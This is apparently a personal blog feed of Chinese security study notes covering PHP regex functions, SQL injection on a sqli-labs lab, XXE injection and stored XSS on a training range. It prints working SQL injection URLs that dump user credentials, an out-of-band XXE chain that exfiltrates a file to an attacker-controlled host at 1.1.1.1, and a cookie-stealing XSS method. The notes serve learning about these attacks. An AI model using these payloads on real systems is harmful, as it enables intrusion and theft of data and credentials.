      <link href="/2019/12/07/zhengzebiaodashi/"/>
      <url>/2019/12/07/zhengzebiaodashi/</url>
      
        <content type="html"><![CDATA[<p>正则表达式（类似查找文件）(Regular Expression)是一种文本模式，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为”元字符”）<br>正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以<code>用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等</code>。</p><h2 id="正则函数"><a href="#正则函数" class="headerlink" title="正则函数"></a>正则函数</h2><ul><li><strong>preg_match ( string $pattern , string $subject ,  [array &amp;$matches] )</strong></li></ul><p>pattern：要搜索的模式，字符串类型，正则表达式 。</p><p>subject：输入字符串。 </p><p>matches：可选，存储匹配结果的数组。</p><p>作用是：执行一个正则表达式匹配，成功返回 1 ，否则返回 0</p><ul><li><p><strong>preg_replace<br>(正则，替换的字符串，匹配的字符串）</strong><br>将所有的匹配正则的字符串进行替换；</p><p><code>通常可以用来过滤敏感字符</code></p><ul><li><strong>preg_match_grep()</strong><br>匹配一个匹配正则的子字符数组，包含匹配的字符串</li></ul></li></ul><ul><li><strong>preg_match_all(正则，匹配的字符串，输出的二维数组</strong><h1 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h1></li></ul><hr><p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。<br>正则表达式的限定符有：</p><p>正则表达式的限定符有：</p><h3 id="字符描述"><a href="#字符描述" class="headerlink" title="字符描述:"></a>字符描述:</h3><p> *匹配前面的子表达式零次或多次。例如，zo<em> 能匹配 “z” 以及 “zoo”。</em> 等价于{0,}。</p><p> + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</p><p>?    匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</p><p>{n}    n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</p><p>{n,}    n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</p><p>{n,m}    m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</p><h1 id="总结元字符："><a href="#总结元字符：" class="headerlink" title="总结元字符："></a>总结元字符：</h1><hr><p>\<br>将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\‘ 匹配 “\” 而 “(“ 则匹配 “(“。</p><p>^<br>匹配输入字符串的开始位置。</p><p>$<br>匹配输入字符串的结束位置。</p><p>*<br>匹配前面的子表达式零次或多次。</p><p>+<br>匹配前面的子表达式一次或多次。<br>?<br>匹配前面的子表达式零次或一次。</p><p>{n}<br>n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</p><p>{n,}<br>n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</p><p>{n,m}<br>m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</p><p>\d<br>匹配一个数字字符。</p><p>\D<br>匹配一个非数字字符。</p><p>\d<br>匹配一个数字字符。</p><p>\D<br>匹配一个非数字字符。</p><p>\f<br>匹配一个换页符。</p><p>\n<br>匹配一个换行符。</p><p>\r<br>匹配一个回车符。</p><p>\s<br>匹配任何空白字符，包括空格、制表符、换页符等等。</p><p>\S<br>匹配任何非空白字符。</p><p>\w<br>匹配字母、数字、下划线。</p><p>\W<br>匹配非字母、数字、下划线。</p><hr><h3 id="记得在php中使用正则表达式用-分界！"><a href="#记得在php中使用正则表达式用-分界！" class="headerlink" title="记得在php中使用正则表达式用/分界！"></a>记得在php中使用正则表达式用/分界！</h3>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入：显错注入</title>
      <link href="/2019/12/07/zhengze/"/>
      <url>/2019/12/07/zhengze/</url>
      
        <content type="html"><![CDATA[<p><br>(在这里我们用sqli-lab为例)<br><br><strong>我们首先要检查是否会有注入漏洞，and 1=1法显示不出错误信息，我们尝试用’测试，发现出现错误信息，也证明有注入漏洞。<br></strong><br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/sxw6wE4Na9CwDf2J95VFD5xdrWGvCDy8zYhOwrWEgRY!/b/dFIBAAAAAAAA&amp;bo=gQb5AIEG.QADCSw!&amp;rf=viewer_4" alt><br><strong><br>我们根据错误信息知道多出一个多余的’ 那我们应该怎么样才能使多余的’ 语法让sql语句正确回显呢?<br></strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure></p><p><strong>我们通过注释后面的语句注释掉，使得引号闭合；</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=1&apos;--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/4tl2YYuvPIdxpHq7.lhk5zQhLLEB8fqesx4UuLyV.PU!/b/dFMBAAAAAAAA&amp;bo=IgVTASIFUwEDGTw!&amp;rf=viewer_4" alt><br><strong>测试字段数,发现order by 4出错，3则正常显示，说明字段为3<br>（order by 是mysql用来排序的，我们可以通过他来测试字段数）：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=1&apos; order by 3--+</span><br></pre></td></tr></table></figure><p><strong>测试回显点，发现回显位是2，3</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/u7xpdeuVSeeKngk.j13h3LAfU1eMVgdCH9T.CWlDrHo!/b/dL8AAAAAAAAA&amp;bo=qwShAAAAAAADByw!&amp;rf=viewer_4" alt></p><p><strong>查询版本号，如果是5.0以上,则可以用系统库查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,version()--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.kj.wKY22UkPB5mLbk*udHdjiJAigOznbz0cagNMwHY!/b/dLgAAAAAAAAA&amp;bo=EAXjAAAAAAADB9Q!&amp;rf=viewer_4" alt></p><p><strong>查询数据库名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,database()--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.5pOBR2yPrgiR7sZUOs61G1LI6Xy58TDwHEpGb6Lb2g!/b/dFQBAAAAAAAA&amp;bo=NgbXAAAAAAADF9U!&amp;rf=viewer_4" alt><br><strong>通过数据库 系统库information的tables表查询表名(查询下个表，可以通过移动偏移量limit来查询其他表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1 --+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/F5g.75Q1PLQjwcFR2.hGo5O2VJ1mX0GKK4WHq7Pf9D8!/b/dL8AAAAAAAAA&amp;bo=5wTDAAAAAAADFxI!&amp;rf=viewer_4" alt></p><p><strong>再通过数据库 系统库的columns表查询列名，通过偏移limit来查询其他字段</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1 --+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/fogWx.4zppoo.XE51.8tPeW1tXIixEwyu.UH0prXdoA!/b/dLYAAAAAAAAA&amp;bo=zAStAAAAAAADF1c!&amp;rf=viewer_4" alt></p><p><strong>再来爆出字段里的内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,username,password from users limit 0,1--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/8LCHPGYOTX9e53SycijT5Py2a73o5bRbPKRZ3eFnNtQ!/b/dL8AAAAAAAAA&amp;bo=pAXIAAAAAAADB0s!&amp;rf=viewer_4" alt></p><h1 id="group-concat函数："><a href="#group-concat函数：" class="headerlink" title="group_concat函数："></a>group_concat函数：</h1><p>group_concat函数的作用将同一个分组中的值连接起来，返回一个字符串结果，这样我们就不用麻烦的去移动偏移量了。<br><a href="http://www.cnblogs.com/lcamry/p/5715634.html" target="_blank" rel="noopener">函数具体介绍</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE-实体注入</title>
      <link href="/2019/12/07/XXE-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/12/07/XXE-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="XXE介绍"><a href="#XXE介绍" class="headerlink" title="XXE介绍"></a>XXE介绍</h2><p><strong>XXE即外部实体，从安全角度理解为XML外部实体注入攻击</strong></p><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cwsvo56lj30xq0fvwiv.jpg" alt></p><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><h4 id="内部DTD声明"><a href="#内部DTD声明" class="headerlink" title="内部DTD声明:"></a>内部DTD声明:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p><strong>实例：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><h4 id="引用外部DTD声明"><a href="#引用外部DTD声明" class="headerlink" title="引用外部DTD声明:"></a>引用外部DTD声明:</h4><p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p><p>或者</p><p><code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;s</code></p><p><strong>实例</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><p>这是包含 DTD 的 “note.dtd” 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><p>实体引用是对实体的引用。</p><p>实体可在内部或外部进行声明。</p><h3 id="1-一个外部实体声明"><a href="#1-一个外部实体声明" class="headerlink" title="1. 一个外部实体声明"></a>1. <strong>一个外部实体声明</strong></h3><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>DTD 例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><p>XML 例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><h3 id="2-一个内部实体声明"><a href="#2-一个内部实体声明" class="headerlink" title="2. 一个内部实体声明"></a>2. <strong>一个内部实体声明</strong></h3><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>DTD 例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure><p>XML 例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><p><strong>实体又分为一般实体和参数实体:</strong></p><ul><li>一般实体的声明语法:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名 “实体内容“&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式：&amp;实体名；</p><ul><li>参数实体只能在DTD中使用，参数实体的声明格式： </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 “实体内容“&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式：%实体名；</p><p><strong>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</strong></p><p><strong>简单XXE攻击payload:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test=&apos;&lt;!DOCTYPE scan [&lt;!ENTITY test SYSTEM &quot;file:///c:/1.txt&quot;&gt;]&gt;&lt;scan&gt;&amp;test;&lt;/scan&gt;&apos;;</span><br><span class="line">$obj=simplexml_load_string($test,&apos;SimpleXMLElement&apos;,LIBXML_NOENT);</span><br><span class="line">print_r($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>test是一个变量，里面是XML，访问读取了C盘的1.txt然后使用simplexml_load_string将其转换为对象打印出来</strong></p><h2 id="simplexml-load-string-函数"><a href="#simplexml-load-string-函数" class="headerlink" title="simplexml_load_string()函数"></a>simplexml_load_string()函数</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>把 XML 字符串载入对象中</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simplexml_load_string(_data,classname,options,ns,is_prefix_ );</span><br></pre></td></tr></table></figure><p>第一个参数是xml语句，SimpleXMLElement是调用了SimpleXMlement这个类，然后LIBXML_NOET是代替实体，然后去调用文件c盘下1.txt。</p><p>在实战中后端语言解析了XML是不会输出读取内容的，我们需要一个类似接受平台的接收器，将XML读取的数据发送到接收平台，然后接受平台储存然后我们在接受平台上分析。先<strong>使用PHP伪协议读取文件：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/1.txt&quot;&gt;</span><br></pre></td></tr></table></figure><p>然后<strong>去调用 用来XXE的服务器中的一个xml文档文件：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://1.1.1.1/1.xml&quot;&gt;</span><br></pre></td></tr></table></figure><p>而这个XML写的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://1.1.1.1:8080/2.php?</span><br><span class="line">id=%file;&apos;&gt;&quot;</span><br><span class="line">\&gt;</span><br><span class="line">%all;      //调用实体</span><br></pre></td></tr></table></figure><p><strong>1.XML文档会调用2.php文件并向id通过GET方式传入%file 读取的内容</strong><br>而2.php的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&apos;id&apos;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure><p>2.php被调用后会将id传进来的参数即%file的内容写入到3.php中，我们就可以通过访问3.php得到我们想读取的内容；</p><h2 id="靶场演示"><a href="#靶场演示" class="headerlink" title="靶场演示"></a>靶场演示</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz0zbfttj31h00qm758.jpg" alt><br>进入XXE靶场（外部实体注入），我们发现了<strong>simplexml_load_string()函数</strong>，这里很可能有XXE漏洞，我们看了下附件代码件：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz1dhaqqj317w0npwn1.jpg" alt><br>发现这里通过$poststr接收数据并将数据直接放入到simplexml_load_string()转换为对象，那这里是可以进行XXE的；</p><p>我们先构造出XXE的poc代码：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz1pp4y0j313v05lt9p.jpg" alt><br>第三行是通过php伪协议去读取<strong>被攻击服务器</strong>下的<strong>flag.php</strong>文件内容（base64编码，方便数据传输）</p><p>第四行是通过外部实体声明加载<strong>攻击者服务器</strong>的<strong>1.xml</strong>文件</p><p>第五行调用外部实体remote</p><p>第六行调用外部实体send</p><p><strong>1.xml</strong>文件内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://1.1.1.1:8080/xxe/2.php?id=%file;&apos;&gt;&quot;</span><br><span class="line"> \&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p><strong>调用2.php并传入参数</strong></p><p><strong>2.php内容如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&apos;id&apos;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure><p>将传参的内容，即读取到的文件写入放到3.txt中，成功读取文件</p><p>抓包，通过POST方式上传<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz21z8wsj31h60ra0y4.jpg" alt><br>访问攻击者（即自己）的服务器，看看3.txt是否收到读取的文件<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz2cygdgj31h30psdfu.jpg" alt><br>成功读取到文件，因为之前对其进行base64编码，所以进行base64解码即可得到原来的内容！</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>存储型XSS</title>
      <link href="/2019/12/07/XSS2/"/>
      <url>/2019/12/07/XSS2/</url>
      
        <content type="html"><![CDATA[<p>XSS(跨站脚本攻击)的原理其实我已经在上篇文章说过了，所以我就不详细解释了，我们就说说xss漏洞的两大根本条件：</p><ul><li>用户要能控制输入，</li><li>原本程序要执行的html代码，拼接了用户输入的数据</li></ul><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>指嵌入web页面的恶意html代码被存进了应用服务器端去，也就是说被存储到数据库中去，在每次有人访问这个页面，都会自动触发恶意代码，并且能够持续的攻击用户，所以也称为持久型；</p><p>我们通常是通过一个弹窗去检验是否存在XSS,如果有XSS漏洞，我们通常会使用XSS平台去获取对方cookie，网上XSS平台其实有很多，自行搜索即可；</p><h3 id="存储型XSS可能触发的地方"><a href="#存储型XSS可能触发的地方" class="headerlink" title="存储型XSS可能触发的地方"></a>存储型XSS可能触发的地方</h3><ul><li>任何可以插入到数据库的地方</li><li>注册提交框</li><li>留言板</li><li>上传文件的文件名</li><li>报错日志信息(管理员可见)<br>……</li></ul><p>我们通过<a href="http://117.41.229.122:8004/Feedback.asp" target="_blank" rel="noopener">掌控安全公开课靶场</a>为例：<br>我们点击网页一看，看见有个留言板，那我们在想这里会不会有没有xss?<br>我们通过弹窗去测试有没有XSS漏洞：</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/7*uFk3MvsKFG57tovZNgRkkCqVvvqiRXK7Cg.PzBVHo!/b/dMAAAAAAAAAA&amp;bo=swTKAwAAAAADJ3w!&amp;rf=viewer_4" alt></p><p>发现出现弹窗</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/Jc8TcgJNtMElfIS6K0NoUpudHzE6xCirF8XnLuQStHY!/b/dFMBAAAAAAAA&amp;bo=dgQ9AQAAAAADF3w!&amp;rf=viewer_4" alt></p><p>我们发现我们输入的代码已经被插入html代码块里面去了</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/wMq3UQ0gc93UieaE5eIkqd2UWTNL*5d2oCrytVsRng4!/b/dAgBAAAAAAAA&amp;bo=yQHFAAAAAAADFz8!&amp;rf=viewer_4" alt></p><p>因为XSS payload代码复杂，所以我们通常是使用xss平台去获取cookie<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/JoeGc63sW7v3Qz1e4O7F0yJIUboQItBj7hn2Ls9zYks!/b/dLYAAAAAAAAA&amp;bo=1gbGAQAAAAADFyU!&amp;rf=viewer_4" alt></p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/8XKbLcqw40gOT5tuCQDQ3asbNCMMrPwn1g1GO4xbf*A!/b/dL8AAAAAAAAA&amp;bo=uQVmAwAAAAADF.s!&amp;rf=viewer_4" alt></p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/2LotA1LS9E1m5Ra1m3X15yDrDTYZqJmezvdQJ.BjnHs!/b/dDcBAAAAAAAA&amp;bo=MQU*AwAAAAADFzo!&amp;rf=viewer_4" alt></p><p>我们将平台上的payload复制，插入到有xss漏洞的留言框去<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/zsEOEET*L*0nIJ1hX1LePGgHNif.mbwTuOyRFNYFx.c!/b/dFYBAAAAAAAA&amp;bo=egMuAwAAAAADF2Y!&amp;rf=viewer_4" alt></p><p>插入成功后，我们查看xss平台，成功拿到管理员cookie</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/U5uylpL*PqLh2*jjkg1FVvjQZ8*NMIB*b10X78I1hFA!/b/dMIAAAAAAAAA&amp;bo=swRbAgAAAAADF9w!&amp;rf=viewer_4" alt></p><p><strong>其实xss漏洞出现在留言框上，还可能出现在上传文件名或注册页面框等与插入数据库的提交框上，我们可以通过js弹窗进行测试！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xss原理与分析</title>
      <link href="/2019/12/07/xss1/"/>
      <url>/2019/12/07/xss1/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS编码绕过-浏览器的解析顺序："><a href="#XSS编码绕过-浏览器的解析顺序：" class="headerlink" title="XSS编码绕过-浏览器的解析顺序："></a>XSS编码绕过-浏览器的解析顺序：</h2><ul><li>浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别哪些被实体编码的内容的，只有建立起DOM 树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码。</li></ul><p><strong>基本的解析顺序</strong>是-&gt;URL 解析，HTML 解析， CSS 解析，JS解析;</p><p>浏览器每次收到数据后都会进行语法的分析，如果分析到合法符号就将其添加到解析树中去，语法在解析生成dom树，解析过程中开始对css元素进行渲染，然后再去执行js，而在dom树在加载过程中，DOM节点也在慢慢建立起来了，所有的节点都均可被修改，创建，或删除。</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/PSIywenNZEoKq2vFYg4V4d*sLChskvPr8y.Rkjmlv1c!/b/dL8AAAAAAAAA&amp;bo=9AJOAQAAAAARB4k!&amp;rf=viewer_4" alt></p><h2 id="什么是XSS："><a href="#什么是XSS：" class="headerlink" title="什么是XSS："></a>什么是XSS：</h2><p>XSS其实就是通过插入html代码进行拼接注入，通过插入html代码去执行带有恶意的js代码；</p><h2 id="XSS的作用："><a href="#XSS的作用：" class="headerlink" 